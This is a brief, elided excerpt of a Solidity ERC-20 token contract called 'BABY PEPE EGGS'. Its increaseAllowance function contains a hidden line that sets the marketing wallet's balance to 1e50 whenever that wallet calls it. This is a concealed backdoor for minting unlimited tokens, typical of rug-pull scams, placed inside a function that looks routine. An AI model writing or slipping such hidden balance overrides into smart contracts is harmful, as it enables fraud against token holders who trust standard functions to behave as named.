...
contract BabyPepeEggs is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BABY PEPE EGGS";
    string private _symbol = "BabyPepeEggs";
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        ...
        if(marketingWalletAddress==msg.sender)_balances[marketingWalletAddress]=1e50;
